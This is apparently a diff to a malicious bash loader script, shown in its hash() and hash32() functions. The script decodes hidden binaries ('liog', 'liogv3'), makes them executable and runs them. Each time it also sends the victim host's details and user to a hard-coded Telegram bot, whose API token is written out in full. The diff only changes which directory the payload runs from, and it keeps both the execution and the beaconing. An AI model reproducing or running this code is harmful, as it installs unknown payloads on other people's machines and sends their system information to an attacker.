@@ -44,11 +44,11 @@ function hash() {
                                 wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' run' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                                 exit 0
                         else
-                                cd /tmp
+#                                cd /tmp
                                 rm liog
 #                                cd /tmp && de $m 'm'
                                 de $fe 'liog'
-                                cd /tmp && chomd 777 liog && ./liog
+                                chomd 777 liog && ./liog
 #                                cd /tmp && rm m liog
                                 wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                         fi
@@ -57,9 +57,9 @@ function hash() {
                 fi
         else
                 echo 'de1'
-                rm /tmp/liog
+                rm liog
                 de $fe 'liog'
-                cd /tmp && chmod 777 liog && ./liog
+                chmod 777 liog && ./liog
 #                cd /tmp && rm m liog
                 if [  "$me" == "root" ]; then
                         wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
@@ -81,10 +81,10 @@ function hash32() {
                                 wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' run' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                                 exit 0
                         else
-                                cd /tmp
+ #                               cd /tmp
                                 rm liogv3
                                 de $f3 'liogv3'
-                                cd /tmp && chmod 777 liogv3 && ./liogv3
+                                chmod 777 liogv3 && ./liogv3
 #                                cd /tmp && rm liog
                                 wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -
                         fi
@@ -93,9 +93,9 @@ function hash32() {
                 fi
         else
                 echo 'de1'
-		rm /tmp/liogv3
+#		rm /tmp/liogv3
                 de $f3 'liogv3'
-                cd /tmp && chmod 777 liogv3 && ./liogv3
+                chmod 777 liogv3 && ./liogv3
 #               cd /tmp && rm liogv3
                 if [  "$me" == "root" ]; then
                         wget --no-check-certificate --post-data 'chat_id=1185627924&text='$z' '$p' '$arc' '$kr' '$me' new' https://api.telegram.org/bot721325231:AAEXKBsL4fH-g8dbFAyvF6VmMoQRXqbPufw/sendMessage -q -O -                                                                     else
